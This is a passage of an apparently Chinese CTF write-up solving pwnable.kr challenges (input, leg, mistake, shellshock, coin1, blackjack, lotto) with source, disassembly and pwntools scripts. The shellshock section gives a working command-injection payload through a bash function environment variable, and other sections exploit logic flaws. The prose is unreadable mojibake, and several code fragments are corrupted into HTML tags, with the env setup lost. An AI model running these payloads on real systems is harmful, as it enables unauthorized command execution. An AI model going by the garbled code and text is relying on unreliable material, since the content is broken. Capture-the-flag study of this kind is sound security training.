<p>è¿™ä¸€å…³å¾ˆç®€å•ï¼Œåˆ›å»ºä¸ªåå­—ä¸º <code>\x0a</code>  çš„æ–‡ä»¶ï¼Œå†…å®¹ä¸º <code>\x00\x00\x00\x00</code></p>
<p>with open(&quot;\x0a&quot;, &quot;wb&quot;) as file:<br />
file.write(&quot;\x00\x00\x00\x00&quot;)<br />
file.close()</p>
<h4 id="stage-5-network"><a class="anchor" href="#stage-5-network">#</a> stage 5 network</h4>
<p>int sd, cd;<br />
struct sockaddr_in saddr, caddr;<br />
sd = socket(AF_INET, SOCK_STREAM, 0);<br />
if(sd == -1){<br />
printf(&quot;socket error, tell admin\n&quot;);<br />
return 0;<br />
}<br />
saddr.sin_family = AF_INET;<br />
saddr.sin_addr.s_addr = INADDR_ANY;<br />
saddr.sin_port = htons( atoi(argv['C']) );<br />
if(bind(sd, (struct sockaddr*)&amp;saddr, sizeof(saddr)) &lt; 0){<br />
printf(&quot;bind error, use another port\n&quot;);<br />
return 1;<br />
}<br />
listen(sd, 1);<br />
int c = sizeof(struct sockaddr_in);<br />
cd = accept(sd, (struct sockaddr <em>)&amp;caddr, (socklen_t</em>)&amp;c);<br />
if(cd &lt; 0){<br />
printf(&quot;accept error, tell admin\n&quot;);<br />
return 0;<br />
}<br />
if( recv(cd, buf, 4, 0) != 4 ) return 0;<br />
if(memcmp(buf, &quot;\xde\xad\xbe\xef&quot;, 4)) return 0;<br />
printf(&quot;Stage 5 clear!\n&quot;);</p>
<p>è¿™ä¸€å…³æ˜¯å»ºç«‹ä¸€ä¸ª socket æ¥æ¥å—æ•°æ®ï¼Œä¸ <code>\xde\xad\xbe\xef</code>  è¿›è¡Œæ¯”è¾ƒã€‚</p>
<p>å…¶ä¸­éœ€è¦æ³¨æ„è¿™ä¸¤å¥</p>
<p>saddr.sin_addr.s_addr = INADDR_ANY;<br />
saddr.sin_port = htons( atoi(argv['C']) );</p>
<p>ç¬¬ä¸€å¥æŒ‡å®šç»‘å®šçš„åœ°å€ï¼Œ <code>INADDR_ANY</code>  äº‹å®ä¸Šè¡¨ç¤ºä¸ç¡®å®šåœ°å€ï¼Œæˆ– â€œæ‰€æœ‰åœ°å€â€ã€â€œä»»æ„åœ°å€â€ï¼Œ <code>127.0.0.1</code>  å½“ç„¶ä¹ŸåŒ…å«åœ¨å†…ï¼Œç¬¬äºŒå¥æŒ‡å®šç»‘å®šç«¯å£ï¼Œç«¯å£å·å°±æ˜¯ argv ['C'] çš„å†…å®¹ï¼Œå› ä¸º argv æ˜¯æˆ‘ä»¬è‡ªå·±è®¾ç½®çš„ï¼Œæ‰€ä»¥åªè¦è®¾ç½®ä¸€ä¸ªä¸ä¸å…¶ä»–ç¨‹åºå†²çªçš„ç«¯å£å·å°±è¡Œã€‚</p>
<p>ç›´æ¥ä½¿ç”¨ pwntools çš„ remote</p>
<p>r = remote(&quot;127.0.0.1&quot;, 9999)<br />
r.send(&quot;\xde\xad\xbe\xef&quot;)</p>
<p><strong>payload</strong></p>
<p>from pwn import *</p>
<h1 id="stage-1-process"><a class="anchor" href="#stage-1-process">#</a> stage 1 process</h1>
<p>argv = list('1' * 100)<br />
argv[0] = &quot;./input&quot;<br />
argv[ord('A')] = &quot;\x00&quot;<br />
argv[ord('B')] = &quot;\x20\x0a\x0d&quot;</p>
<h1 id="stage-2-stdio-2"><a class="anchor" href="#stage-2-stdio-2">#</a> stage 2 stdio</h1>
<p>with open(&quot;stdin.txt&quot;, &quot;wb&quot;) as file:<br />
file.write(&quot;\x00\x0a\x00\xff&quot;)<br />
file.close()<br />
with open(&quot;stderr.txt&quot;, &quot;wb&quot;) as file:<br />
file.write(&quot;\x00\x0a\x02\xff&quot;)<br />
file.close()</p>
<h1 id="stage-3-env-2"><a class="anchor" href="#stage-3-env-2">#</a> stage 3 env</h1>
<p \xde\xad\xbe\xef:\xca\xfe\xba\xbe="">env =</p>
<h1 id="stage-4-file-2"><a class="anchor" href="#stage-4-file-2">#</a> stage 4 file</h1>
<p>with open(&quot;\x0a&quot;, &quot;wb&quot;) as file:<br />
file.write(&quot;\x00\x00\x00\x00&quot;)<br />
file.close()</p>
<h1 id="stage-5-network-2"><a class="anchor" href="#stage-5-network-2">#</a> stage 5 network</h1>
<p>argv[ord('C')] = &quot;9999&quot;</p>
<p>p = process(argv=argv, env=env, stdin=open(&quot;stdin.txt&quot;,&quot;rb&quot;), stderr=open(&quot;stderr.txt&quot;,&quot;rb&quot;))<br />
r = remote(&quot;127.0.0.1&quot;, 9999)<br />
r.send(&quot;\xde\xad\xbe\xef&quot;)<br />
r.close()</p>
<p>print p.recv()<br />
print p.recv()</p>
<h2 id="leg"><a class="anchor" href="#leg">#</a> leg</h2>
<h3 id="é¢˜ç›®æè¿°-8"><a class="anchor" href="#é¢˜ç›®æè¿°-8">#</a> é¢˜ç›®æè¿°</h3>
<p>#include &lt;stdio.h&gt;<br />
#include &lt;fcntl.h&gt;<br />
int key1(){<br />
asm(&quot;mov r3, pc\n&quot;);<br />
}<br />
int key2(){<br />
asm(<br />
&quot;push	{r6}\n&quot;<br />
&quot;add	r6, pc, $1\n&quot;<br />
&quot;bx	r6\n&quot;<br />
&quot;.code   16\n&quot;<br />
&quot;mov	r3, pc\n&quot;<br />
&quot;add	r3, $0x4\n&quot;<br />
&quot;push	{r3}\n&quot;<br />
&quot;pop	{pc}\n&quot;<br />
&quot;.code	32\n&quot;<br />
&quot;pop	{r6}\n&quot;<br />
);<br />
}<br />
int key3(){<br />
asm(&quot;mov r3, lr\n&quot;);<br />
}<br />
int main(){<br />
int key=0;<br />
printf(&quot;Daddy has very strong arm!ğŸ˜Š;<br />
scanf(&quot;%d&quot;, &amp;key);<br />
if( (key1()+key2()+key3()) == key ){<br />
printf(&quot;Congratz!\n&quot;);<br />
int fd = open(&quot;flag&quot;, O_RDONLY);<br />
char buf[100];<br />
int r = read(fd, buf, 100);<br />
write(0, buf, r);<br />
}<br />
else{<br />
printf(&quot;I have strong leg ğŸ˜›\n&quot;);<br />
}<br />
return 0;<br />
}</p>
<h3 id="é¢˜ç›®è§£æ-8"><a class="anchor" href="#é¢˜ç›®è§£æ-8">#</a> é¢˜ç›®è§£æ</h3>
<p>ç¬¬ 27 è¡Œä¸­ <code>if( (key1()+key2()+key3()) == key )</code>  æ˜¾ç¤º key çš„å€¼ä¸º <code>key1()+key2()+key3()</code>  çš„æ€»å’Œï¼Œç›¸ç­‰å³å¯å¾—åˆ° flagã€‚</p>
<p>æºç ä¸­çš„çœ‹ä¸æ‡‚ï¼Œç›´æ¥å»çœ‹åæ±‡ç¼–ä¸­çš„éƒ¨åˆ†ä»£ç ã€‚</p>
<p>(gdb) disass key1<br />
Dump of assembler code for function key1:<br />
0x00008cd4 &lt;+0&gt;:		push	{r11}		; (str r11, [sp, #-4]!)<br />
0x00008cd8 &lt;+4&gt;:		add	r11, sp, #0<br />
0x00008cdc &lt;+8&gt;:		mov	r3, pc<br />
0x00008ce0 &lt;+12&gt;:	mov	r0, r3<br />
0x00008ce4 &lt;+16&gt;:	sub	sp, r11, #0<br />
0x00008ce8 &lt;+20&gt;:	pop	{r11}		; (ldr r11, [sp], #4)<br />
0x00008cec &lt;+24&gt;:	bx	lr<br />
End of assembler dump.</p>
<p>é¦–å…ˆäº†è§£ä¸‹<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2FuZHk3MDAyL2FydGljbGUvZGV0YWlscy83Mjg1MjgyMg=="> ARM å‡½æ•°è°ƒç”¨çº¦å®š</span>ï¼Œå…¶ä¸­ï¼Œç»“æœä¸ºä¸€ä¸ª 32 ä½çš„æ•´æ•°æ—¶ï¼Œå¯ä»¥é€šè¿‡å¯„å­˜å™¨ R0 è¿”å›ï¼Œæ ¹æ®æ±‡ç¼–ä»£ç å¯ä»¥çœ‹å‡ºï¼Œr3 å¯„å­˜å™¨ä¸­çš„å€¼ä¼ ç»™äº† r0ï¼Œè€Œ pc çš„å€¼åˆä¼ ç»™äº† r3ã€‚</p>
<p>å†æ¥äº†è§£ä¸‹<span class="exturl" data-url="aHR0cHM6Ly9iYnMuaWNodW5xaXUuY29tL3RocmVhZC00MDQ5My0xLTEuaHRtbD9mcm9tPWJreWw="> pc å¯„å­˜å™¨</span>ï¼Œå…·ä½“å°±ä¸è§£é‡Šäº†ä¸æ‡‚ï¼Œå¤§æ¦‚å°±æ˜¯</p>
<p>ARM æ¨¡å¼ä¸‹ï¼Œpc = å½“å‰æŒ‡ä»¤åœ°å€ + 8ï¼›</p>
<p>Thumb æ¨¡å¼ä¸‹ï¼Œpc = å½“å‰æŒ‡ä»¤ + 4</p>
<p>è€Œæ§åˆ¶ä»€ä¹ˆæ¨¡å¼çš„å°±æ˜¯ä¸€äº›å¸¦çŠ¶æ€çš„æŒ‡ä»¤ï¼Œæ¯”å¦‚ bx addrï¼Œbx å°±æ˜¯å¸¦çŠ¶æ€åˆ‡æ¢è·³è½¬æŒ‡ä»¤ï¼Œå½“ addr çš„æœ€åä¸€ä½ä¸º 1 æ—¶ï¼Œä¼šå°†è·³è½¬åœ°å€å¤„çš„ä»£ç è§£æä¸º Thumb æŒ‡ä»¤ï¼Œæœ€åä¸€ä½ä¸º 0 çš„è¯ï¼Œå°±è§£ææˆ ARM æŒ‡ä»¤ã€‚</p>
<p>æ‰€ä»¥ key1=8cdc+8=8CE4â€¬</p>
<p>(gdb) disass key2<br />
Dump of assembler code for function key2:<br />
0x00008cf0 &lt;+0&gt;:	push	{r11}		; (str r11, [sp, #-4]!)<br />
0x00008cf4 &lt;+4&gt;:	add	r11, sp, #0<br />
0x00008cf8 &lt;+8&gt;:	push	{r6}		; (str r6, [sp, #-4]!)<br />
0x00008cfc &lt;+12&gt;:	add	r6, pc, #1<br />
0x00008d00 &lt;+16&gt;:	bx	r6<br />
0x00008d04 &lt;+20&gt;:	mov	r3, pc<br />
0x00008d06 &lt;+22&gt;:	adds	r3, #4<br />
0x00008d08 &lt;+24&gt;:	push	{r3}<br />
0x00008d0a &lt;+26&gt;:	pop	{pc}<br />
0x00008d0c &lt;+28&gt;:	pop	{r6}		; (ldr r6, [sp], #4)<br />
0x00008d10 &lt;+32&gt;:	mov	r0, r3<br />
0x00008d14 &lt;+36&gt;:	sub	sp, r11, #0<br />
0x00008d18 &lt;+40&gt;:	pop	{r11}		; (ldr r11, [sp], #4)<br />
0x00008d1c &lt;+44&gt;:	bx	lr<br />
End of assembler dump.</p>
<p>å¯ä»¥çœ‹åˆ° pc çš„å€¼ä¼ ç»™äº† r3ï¼Œr3 å†ä¸ 4 ç›¸åŠ ï¼Œæœ€åç»™ r0ï¼Œè¿™æ ·çš„è¯ key2 çš„å€¼å°±åº”è¯¥ä¸º 8D10â€¬ï¼Œä½†æ˜¯ç”±äºå‰é¢æ‰§è¡Œ bx r6 æ—¶ r6 æœ€åä¸€ä½ä¸º 1ï¼Œæ‰€ä»¥æ‰§è¡Œåé¢ä»£ç æ—¶çš„æ¨¡å¼æ˜¯ Thumb æ¨¡å¼ï¼Œæ‰€ä»¥ <code>mov r3, pc</code>  æ—¶ pc çš„å€¼ä¸º 8D08ã€‚</p>
<p>key2=8d04+4+4=8D0Câ€¬</p>
<p>(gdb) disass key3<br />
Dump of assembler code for function key3:<br />
0x00008d20 &lt;+0&gt;:	push	{r11}		; (str r11, [sp, #-4]!)<br />
0x00008d24 &lt;+4&gt;:	add	r11, sp, #0<br />
0x00008d28 &lt;+8&gt;:	mov	r3, lr<br />
0x00008d2c &lt;+12&gt;:	mov	r0, r3<br />
0x00008d30 &lt;+16&gt;:	sub	sp, r11, #0<br />
0x00008d34 &lt;+20&gt;:	pop	{r11}		; (ldr r11, [sp], #4)<br />
0x00008d38 &lt;+24&gt;:	bx	lr<br />
End of assembler dump.</p>
<p>lr-&gt;r3-&gt;r0ï¼Œlr æ˜¯å¯„å­˜å™¨ R14: è¿æ¥å¯„å­˜å™¨ï¼Œè®°ä½œ lr ; å®ƒç”¨äºä¿å­˜å­ç¨‹åºçš„è¿”å›åœ°å€ï¼Œè¿”å›åœ°å€å°±æ˜¯è°ƒç”¨å‡½æ•°ä¸‹é¢é‚£ä¸€å¥çš„åœ°å€</p>
<p>0x00008d7c &lt;+64&gt;:	bl	0x8d20 &lt;key3&gt;<br />
0x00008d80 &lt;+68&gt;:	mov	r3, r0</p>
<p>key3=8d80</p>
<p><strong>key=key1+key2+key3=â€­â€­0x1A770â€¬=108400â€¬</strong></p>
<h2 id="mistake"><a class="anchor" href="#mistake">#</a> mistake</h2>
<h3 id="é¢˜ç›®æè¿°-9"><a class="anchor" href="#é¢˜ç›®æè¿°-9">#</a> é¢˜ç›®æè¿°</h3>
<p>hint:operator priority</p>
<p>#include &lt;stdio.h&gt;<br />
#include &lt;fcntl.h&gt;</p>
<p>#define PW_LEN 10<br />
#define XORKEY 1</p>
<p>void xor(char* s, int len)<ruby>
	int i;
	for(i=0; i&lt;len; i++){
		s[i] <rp>(</rp><rt> XORKEY;
	</rt><rp>)</rp></ruby><br />
}</p>
<p>int main(int argc, char* argv[]){</p>
<pre><code>int fd;
if(fd=open(&quot;/home/mistake/password&quot;,O_RDONLY,0400) &lt; 0)&#123;
	printf(&quot;can't open password %d\n&quot;, fd);
	return 0;
&#125;

printf(&quot;do not bruteforce...\n&quot;);
sleep(time(0)%20);

char pw_buf[PW_LEN+1];
int len;
if(!(len=read(fd,pw_buf,PW_LEN) &gt; 0))&#123;
	printf(&quot;read error\n&quot;);
	close(fd);
	return 0;		
&#125;

char pw_buf2[PW_LEN+1];
printf(&quot;input password:&quot;);
scanf(&quot;%10s&quot;, pw_buf2);

// xor your input
xor(pw_buf2, 10);

if(!strncmp(pw_buf, pw_buf2, PW_LEN))&#123;
	printf(&quot;Password OK\n&quot;);
	system(&quot;/bin/cat flag\n&quot;);
&#125;
else&#123;
	printf(&quot;Wrong Password\n&quot;);
&#125;

close(fd);
return 0;
</code></pre>
<p>}</p>
<h3 id="é¢˜ç›®è§£æ-9"><a class="anchor" href="#é¢˜ç›®è§£æ-9">#</a> é¢˜ç›®è§£æ</h3>
<p>é¢˜ç›®æç¤ºæ“ä½œç¬¦ä¼˜å…ˆçº§</p>
<p>è¿™é¢˜é—®é¢˜å‡ºåœ¨</p>
<p>if(fd=open(&quot;/home/mistake/password&quot;,O_RDONLY,0400) &lt; 0){<br />
printf(&quot;can't open password %d\n&quot;, fd);<br />
return 0;<br />
}</p>
<p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>&lt;</mo></mrow><annotation encoding="application/x-tex">&lt;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mrel">&lt;</span></span></span></span> ä¼˜å…ˆçº§è¦æ¯”<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>=</mo></mrow><annotation encoding="application/x-tex">=</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">=</span></span></span></span> å·é«˜ï¼Œæ‰€ä»¥ä¼šå…ˆåˆ¤æ–­ <code>open(&quot;/home/mistake/password&quot;,O_RDONLY,0400) &lt; 0</code> ï¼Œ <code>open</code>  å‡½æ•°è¯»å–æˆåŠŸæ–‡ä»¶æè¿°ç¬¦ï¼Œå¿…å®šå¤§äº 0ï¼Œæ‰€ä»¥ <code>open(&quot;/home/mistake/password&quot;,O_RDONLY,0400) &lt; 0</code>  æ•´ä¸ªå¼å­çš„å€¼å°±ä¸º false (0)ï¼Œä¹Ÿå°±æ˜¯ fd=0ã€‚</p>
<p>é‚£ä¹ˆä¸‹é¢çš„ <code>read(fd,pw_buf,PW_LEN)</code>  å…¶å®å°±æ˜¯ä»æ ‡å‡†è¾“å…¥é‡Œé¢è¯»å–æ•°æ®ã€‚</p>
<p>å½“è¾“å…¥ 1234567890ï¼Œä¸ 1 è¿›è¡Œå¼‚æˆ–è¿ç®—åå¯ä»¥å¾—åˆ° 0325476981</p>
<h2 id="shellshock"><a class="anchor" href="#shellshock">#</a> shellshock</h2>
<h3 id="é¢˜ç›®æè¿°-10"><a class="anchor" href="#é¢˜ç›®æè¿°-10">#</a> é¢˜ç›®æè¿°</h3>
<p>Mommy, there was a shocking news about bash.</p>
<p>I bet you already know, but lets just make it sure ğŸ˜ƒ</p>
<p>ssh <span class="exturl" data-url="bWFpbHRvOnNoZWxsc2hvY2tAcHduYWJsZS5rcg==">shellshock@pwnable.kr</span> -p2222 (pw:guest)</p>
<p>#include &lt;stdio.h&gt;<br />
int main(){<br />
setresuid(getegid(), getegid(), getegid());<br />
setresgid(getegid(), getegid(), getegid());<br />
system(&quot;/home/shellshock/bash -c 'echo shock_me'&quot;);<br />
return 0;<br />
}</p>
<h3 id="é¢˜ç›®è§£æ-10"><a class="anchor" href="#é¢˜ç›®è§£æ-10">#</a> é¢˜ç›®è§£æ</h3>
<p>setresgid</p>
<p>åˆ†åˆ«è®¾ç½®çœŸå®çš„ï¼Œæœ‰æ•ˆçš„å’Œä¿å­˜è¿‡çš„ç»„æ ‡è¯†å·</p>
<p>setresuid</p>
<p>åˆ†åˆ«è®¾ç½®çœŸå®çš„ï¼Œæœ‰æ•ˆçš„å’Œä¿å­˜è¿‡çš„ç”¨æˆ·æ ‡è¯†å·</p>
<p>å†çœ‹ä¸€ä¸‹æƒé™</p>
<p>shellshock@prowl:~$ ls -l<br />
total 960<br />
-r-xr-xr-x 1 root shellshock     959120 Oct 12  2014 bash<br />
-r--r----- 1 root shellshock_pwn     47 Oct 12  2014 flag<br />
-r-xr-sr-x 1 root shellshock_pwn   8547 Oct 12  2014 shellshock<br />
-r--r--r-- 1 root root              188 Oct 12  2014 shellshock.c</p>
<p>shellshock æ–‡ä»¶æ‰€å±ç»„æƒé™ä¸­æœ‰ä¸€ä¸ª sï¼Œè€Œ s çš„å«ä¹‰ä»£è¡¨<strong> SGID (Set Group ID, 4)</strong></p>
<ul>
<li><strong>SGID(Set Group ID, 4):</strong></li>
</ul>
<p>å¯¹äºå¯æ‰§è¡Œæ–‡ä»¶ï¼Œ <code>SGID</code>  ä¸ <code>SUID</code>  ç±»ä¼¼ï¼Œå¼•å‘çš„è¿›ç¨‹çš„æ‰€æœ‰ç»„æ˜¯ç¨‹åºæ–‡ä»¶æ‰€å±çš„ç»„ã€‚å¯¹äºç›®å½•ï¼Œ <code>SGID</code>  å±æ€§ä¼šä½¿ç›®å½•ä¸­æ–°å»ºæ–‡ä»¶çš„æ‰€å±ç»„ä¸è¯¥ç›®å½•ç›¸åŒã€‚ <code>SGID</code>  ä¹Ÿå¯ä»¥ç”¨ s è¡¨ç¤ºï¼Œå¦‚:</p>
<p>$ ls -l /vardrwxrwsr-x  2 root staff    4096 Apr 10  2014 localdrwxrwxr-x 15 root syslog   4096 Apr  4 19:57 log</p>
<p>ä¹Ÿå°±æ˜¯è¯´ shellshock è¿è¡Œæ—¶ä¼šå¾—åˆ° shellshock_pwn çš„æƒé™ã€‚</p>
<p>æƒé™å¾—åˆ°äº†ï¼Œä½†æ˜¯ç¨‹åºä¸­å¹¶æ²¡æœ‰å¯ä»¥å¾—åˆ° flag çš„åœ°æ–¹ï¼Œæ‰€ä»¥å°±è¦åˆ©ç”¨åˆ° shellshock æ¼æ´ï¼Œæ¼æ´äº§ç”ŸåŸå› æ˜¯ç”±äº bash ä½¿ç”¨çš„ç¯å¢ƒå˜é‡æ˜¯é€šè¿‡å‡½æ•°åç§°æ¥è°ƒç”¨çš„ï¼Œä»¥ â€œ(){â€ å¼€å¤´é€šè¿‡ç¯å¢ƒå˜é‡æ¥å®šä¹‰çš„ã€‚è€Œåœ¨å¤„ç†è¿™æ ·çš„ â€œå‡½æ•°ç¯å¢ƒå˜é‡â€ çš„æ—¶å€™ï¼Œå¹¶æ²¡æœ‰ä»¥å‡½æ•°ç»“å°¾ â€œ}â€ ä¸ºç»“æŸï¼Œè€Œæ˜¯ä¸€ç›´æ‰§è¡Œå…¶åçš„ shell å‘½ä»¤ï¼Œä¾‹å¦‚ï¼š</p>
<p>env x='() { :;}; echo vulnerable' bash -c &quot;echo this is a test&quot;</p>
<p>å­˜åœ¨æ¼æ´çš„ bash ç‰ˆæœ¬ä¼šè¾“å‡º</p>
<p>vulnerable<br />
this is a test</p>
<p>åœ¨åé¢åŠ  <code>bash -c</code>  çš„åŸå› æ˜¯æ‰“å¼€ä¸€ä¸ª bash ä½¿å…¶ç«‹å³è§¦å‘æ¼æ´ï¼Œå› ä¸ºå½“å‰ bash æ²¡æœ‰ç»§æ‰¿ç¯å¢ƒå˜é‡ã€‚</p>
<p>æ‰€ä»¥æœ€ç»ˆ payloadï¼š</p>
<p>env x='() { :;}; bash -c cat flag' ./shellshock</p>
<h4 id="å‚è€ƒæ–‡ç« "><a class="anchor" href="#å‚è€ƒæ–‡ç« ">#</a> å‚è€ƒæ–‡ç« </h4>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvc3lzdGVtLzQ1MzkwLmh0bWw=">https://www.freebuf.com/articles/system/45390.html</span></p>
<p><span class="exturl" data-url="aHR0cDovL2Fpa2luLm1lLzIwMTUvMDQvMDMvbGludXgtZmlsZS1wZXJtaXNzaW9uLW93ZXIv">http://aikin.me/2015/04/03/linux-file-permission-ower/</span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N0YXJ0ZXI=">https://blog.csdn.net/starter</span>_/article/details/78164387</p>
<h2 id="coin1"><a class="anchor" href="#coin1">#</a> coin1</h2>
<h3 id="é¢˜ç›®æè¿°-11"><a class="anchor" href="#é¢˜ç›®æè¿°-11">#</a> é¢˜ç›®æè¿°</h3>
<pre><code>---------------------------------------------------
-              Shall we play a game?              -
---------------------------------------------------

You have given some gold coins in your hand
however, there is one counterfeit coin among them
counterfeit coin looks exactly same as real coin
however, its weight is different from real one
real coin weighs 10, counterfeit coin weighes 9
help me to find the counterfeit coin with a scale
if you find 100 counterfeit coins, you will get reward :)
FYI, you have 60 seconds.

- How to play - 
1. you get a number of coins (N) and number of chances (C)
2. then you specify a set of index numbers of coins to be weighed
3. you get the weight information
4. 2~3 repeats C time, then you give the answer

- Example -
[Server] N=4 C=2 	# find counterfeit among 4 coins with 2 trial
[Client] 0 1 		# weigh first and second coin
[Server] 20			# scale result:20
[Client] 3			# weigh fourth coin
[Server] 10			# scale result:10
[Client] 2 			# counterfeit coin is third!
[Server] Correct!

- Ready? starting in 3 sec... -
</code></pre>
<p>ç®€å•æ¥è¯´å°±æ˜¯ç»™ä¸€ç»„ç¡¬å¸ï¼Œå…¶ä¸­æœ‰ä¸€ä¸ªå‡ç¡¬å¸ï¼ŒçœŸç¡¬å¸é‡é‡ 10ï¼Œå‡çš„é‡é‡ 9ï¼Œåœ¨æœ‰é™çš„æ¬¡æ•°ä¸­çŒœå‡ºæ¥å‡çš„ç¡¬å¸æ˜¯å“ªä¸€ä¸ªï¼Œå¯ä»¥é€šè¿‡è¾“å…¥ <code>0 1 2 3 4 .....</code>  æ¥äº†è§£ <code>0 1 2 3 4 .....</code>  è¿™ä¸€ç»„ç¡¬å¸é‡é‡çš„ç»¼åˆã€‚</p>
<h3 id="é¢˜ç›®è§£æ-11"><a class="anchor" href="#é¢˜ç›®è§£æ-11">#</a> é¢˜ç›®è§£æ</h3>
<p>åˆ©ç”¨äºŒåˆ†æŸ¥æ‰¾å¯ä»¥å¾ˆå¿«å¾—åˆ°ç­”æ¡ˆ</p>
<p>from pwn import *</p>
<p>r = remote(&quot;<span class="exturl" data-url="aHR0cDovL3B3bmFibGUua3I=">pwnable.kr</span>&quot;, 9007)</p>
<p>for i in range(31):<br />
print r.recvline()</p>
<p>for i in range(100):<br />
n_c = r.recvline()<br />
# print n_c<br />
N = int(n_c.split(&quot; &quot;)[0][2:])<br />
C = int(n_c.split(&quot; &quot;)[1][2:])<br />
print &quot;[*]N=%d,C=%d&quot; % (N, C)<br />
left, right = 0, N<br />
mid = int((left+right) / 2)<br />
for i in range(C):<br />
payload = ' '.join([str(i) for i in range(left, mid)])<br />
r.sendline(payload)<br />
weight = int(r.recvline())<br />
if weight % 10 == 0:<br />
left = mid<br />
right = right<br />
mid = int((right + left) / 2.0)<br />
else:<br />
left = left<br />
right = mid<br />
mid = int((left + right) / 2.0)<br />
r.sendline(str(left))<br />
print r.recvline()</p>
<p>ä½†æ˜¯åœ¨æœ¬åœ°æ‰§è¡Œè„šæœ¬æ—¶ç”±äºç½‘é€Ÿé—®é¢˜ï¼Œå¯¼è‡´æ— æ³•åœ¨ 60s å†…è·‘åˆ°ç¬¬ 100 æ¬¡ï¼Œæ‰€ä»¥è¦æŠŠè„šæœ¬æ”¾åˆ°æœåŠ¡å™¨ä¸Šå»æ‰§è¡Œã€‚</p>
<p>è¿ä¸Šä¹‹å‰ä»»æ„ä¸€é“é¢˜ç›®çš„ sshï¼Œåœ¨ tmp ç›®å½•ä¸‹å†™å¥½è„šæœ¬ï¼Œ <code>r = remote(&quot;pwnable.kr&quot;, 9007)</code>  æ”¹ä¸º <code>r = remote(&quot;0.0.0.0&quot;,9007)</code>  å³å¯ã€‚</p>
<h2 id="blackjack"><a class="anchor" href="#blackjack">#</a> blackjack</h2>
<h3 id="é¢˜ç›®æè¿°-12"><a class="anchor" href="#é¢˜ç›®æè¿°-12">#</a> é¢˜ç›®æè¿°</h3>
<p>Hey! check out this C implementation of blackjack game!<br />
I found it online</p>
<p><span class="exturl" data-url="aHR0cDovL2Nib2FyZC5jcHJvZ3JhbW1pbmcuY29tL2MtcHJvZ3JhbW1pbmcvMTE0MDIzLXNpbXBsZS1ibGFja2phY2stcHJvZ3JhbS5odG1s">http://cboard.cprogramming.com/c-programming/114023-simple-blackjack-program.html</span></p>
<p>I like to give my flags to millionares.<br />
how much money you got?</p>
<p>Running at:nc <span class="exturl" data-url="aHR0cDovL3B3bmFibGUua3I=">pwnable.kr</span> 9009</p>
<p>blackjackï¼Œåˆå 21 ç‚¹ï¼Œè¯¦è§æ¸¸æˆè§„åˆ™</p>
<p>å¤§æ¦‚å°±æ˜¯èµŒè°çš„ç‚¹å¤§çš„æ¸¸æˆ</p>
<h3 id="é¢˜ç›®è§£æ-12"><a class="anchor" href="#é¢˜ç›®è§£æ-12">#</a> é¢˜ç›®è§£æ</h3>
<p>åŸæœ¬ä»¥ä¸ºæ˜¯ä¸ªæ­£ç»çš„ pwn é¢˜ï¼Œä½†æ˜¯çœ‹åˆ°åé¢å‘ç°æ˜¯é“æºç å®¡è®¡é¢˜ã€‚</p>
<p>ä¸»è¦é—®é¢˜å‡ºåœ¨ <code>betting</code>  å‡½æ•°ä¸­</p>
<p>int betting() //Asks user amount to bet<br />
{<br />
printf(&quot;\n\nEnter Bet: $&quot;);<br />
scanf(&quot;%d&quot;, &amp;bet);</p>
<p>if (bet &gt; cash) //If player tries to bet more money than player has<br />
{<br />
printf(&quot;\nYou cannot bet more money than you have.&quot;);<br />
printf(&quot;\nEnter Bet: &quot;);<br />
scanf(&quot;%d&quot;, &amp;bet);<br />
return bet;<br />
}<br />
else return bet;<br />
} // End Function</p>
<p>åœ¨åˆ¤æ–­ <code>bet &gt; cash</code>  ä¹‹åï¼Œåˆè¿›è¡Œäº†ä¸€æ¬¡ scanfï¼Œå¹¶ä¸”æ²¡æœ‰è¿›è¡Œåˆ¤æ–­ï¼Œç›´æ¥è¿”å›ã€‚æ‰€ä»¥ç¬¬ä¸€æ¬¡è¾“å…¥ä¸€ä¸ªå¤§äº 500 çš„å€¼ï¼Œç¬¬äºŒæ¬¡å†è¾“å…¥ä¸€ä¸ªå¤§äº 1000000 çš„æ•°å°±å¯ä»¥å¾—åˆ° flagã€‚</p>
<h2 id="lotto"><a class="anchor" href="#lotto">#</a> lotto</h2>
<h3 id="é¢˜ç›®æè¿°-13"><a class="anchor" href="#é¢˜ç›®æè¿°-13">#</a> é¢˜ç›®æè¿°</h3>
<p>#include &lt;stdio.h&gt;<br />
#include &lt;stdlib.h&gt;<br />
#include &lt;string.h&gt;<br />
#include &lt;fcntl.h&gt;</p>
<p>unsigned char submit[6];</p>
<p>void play(){</p>
<pre><code>int i;
printf(&quot;Submit your 6 lotto bytes:&quot;);
fflush(stdout);

int r;
r = read(0, submit, 6);

printf(&quot;Lotto Start!\n&quot;);
//sleep(1);

// generate lotto numbers
int fd = open(&quot;/dev/urandom&quot;, O_RDONLY);
if(fd==-1)&#123;
	printf(&quot;error. tell admin\n&quot;);
	exit(-1);
&#125;
unsigned char lotto[6];
if(read(fd, lotto, 6) != 6)&#123;
	printf(&quot;error2. tell admin\n&quot;);
	exit(-1);
&#125;
for(i=0; i&lt;6; i++)&#123;
	lotto[i] = (lotto[i] % 45) + 1;		// 1 ~ 45
&#125;
close(fd);

// calculate lotto score
int match = 0, j = 0;
for(i=0; i&lt;6; i++)&#123;
	for(j=0; j&lt;6; j++)&#123;
		if(lotto[i] == submit[j])&#123;
			match++;
		&#125;
	&#125;
&#125;

// win!
if(match == 6)&#123;
	system(&quot;/bin/cat flag&quot;);
&#125;
else&#123;
	printf(&quot;bad luck...\n&quot;);
&#125;
</code></pre>
<p>}</p>
<p>void help(){<br />
printf(&quot;- nLotto Rule -\n&quot;);<br />
printf(&quot;nlotto is consisted with 6 random natural numbers less than 46\n&quot;);<br />
printf(&quot;your goal is to match lotto numbers as many as you can\n&quot;);<br />
printf(&quot;if you win lottery for <em>1st place</em>, you will get reward\n&quot;);<br />
printf(&quot;for more details, follow the link below\n&quot;);<br />
